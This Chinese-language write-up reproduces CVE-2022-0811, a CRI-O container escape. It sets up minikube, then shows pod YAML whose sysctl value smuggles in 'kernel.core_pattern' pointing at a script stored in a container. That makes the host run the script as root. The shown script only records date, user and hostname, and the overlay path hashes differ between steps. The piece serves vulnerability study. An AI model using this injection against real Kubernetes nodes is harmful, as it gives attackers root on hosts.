# CVE-2022-0811漏洞复现及分析

## 故事背景

故事的背景要从这个[cri-o commit](https://github.com/cri-o/cri-o/commit/26de5b665937608100817bc3b21f3eca41014dd2)说起：
```
pinns: allow sysctls to be passed
sysctls must be passed to pinns of the format -s 'key=value'+'key2=value2'
also, move the pinns source code to `pinns/src` to clean up the top level directory a bit

```

## 漏洞复现
按照[crowdstrike](crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/)原文中的步骤貌似有些问题，下面是我修正后的部署步骤。
使用minikube创建基本环境：

**安装minikube**
```
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
```
**利用minikube部署环境**
```
minikube start --kubernetes-version=v1.23.3  --container-runtime=crio --extra-config=kubelet.cgroup-driver=systemd
```
这里需要指定cri-o版本为1.9以上。


### 启动pod来执行恶意脚本**
创建malicious-script-host.yaml文件：
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-script-host
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]
```
执行`kubectl create -f ./malicious-script-host.yaml`启动pod

最终，内核将调用这个pod中的一个脚本来响应一个核心转储。内核将在主机挂载名称空间中起作用，因此我们需要确定从这个名称空间到容器文件系统的路径。

```
ubuntu@VM-16-9-ubuntu:~$ kubectl exec -it malicious-script-host -- /bin/sh
/ # mount
overlay on / type overlay (rw,nodev,relatime,lowerdir=/var/lib/containers/storage/overlay/l/IKOWDZD2CTQDWYPYXIDKDNRVMJ,upperdir=/var/lib/containers/storage/overlay/f8be84d363927dc25af50e7ac17b1ffdc6514e64d7b3375f9198aa051a2f9211/diff,workdir=/var/lib/containers/storage/overlay/f8be84d363927dc25af50e7ac17b1ffdc6514e64d7b3375f9198aa051a2f9211/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
tmpfs on /etc/resolv.conf type tmpfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /etc/hostname type tmpfs (rw,nosuid,nodev,noexec,relatime)
/dev/vda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/vda1 on /dev/termination-log type ext4 (rw,relatime,errors=remount-ro,data=ordered)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=1876832k)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)

```
这里省略了一些内容，我们只需关注第一行中的`                            
/var/lib/containers/storage/overlay/8773b4c7542fd1bd5bbc48b2ce6be572e07acf669fb154bfae277a94835b1cfc/diff`
注意： 每个人的环境中这里都不一样，后面内容需要对应修改。

**创建一个恶意脚本来调用核心转储**
```
#!/bin/sh
date >> /var/lib/containers/storage/overlay/8773b4c7542fd1bd5bbc48b2ce6be572e07acf669fb154bfae277a94835b1cfc/diff/output
whoami >> /var/lib/containers/storage/overlay/8773b4c7542fd1bd5bbc48b2ce6be572e07acf669fb154bfae277a94835b1cfc/diff/output
hostname >>  /var/lib/containers/storage/overlay/8773b4c7542fd1bd5bbc48b2ce6be572e07acf669fb154bfae277a94835b1cfc/diff/output
```
### 使用第二个Pod指向恶意脚本的核心模式
创建sysctl-set.yaml文件

```
apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
spec:
  securityContext:
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/malicious.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]
```
执行`kubectl create -f ./sysctl-set.yaml`启动该pod。

它成功地更新了节点范围内的core_pattern，使其指向我们的恶意脚本主机容器
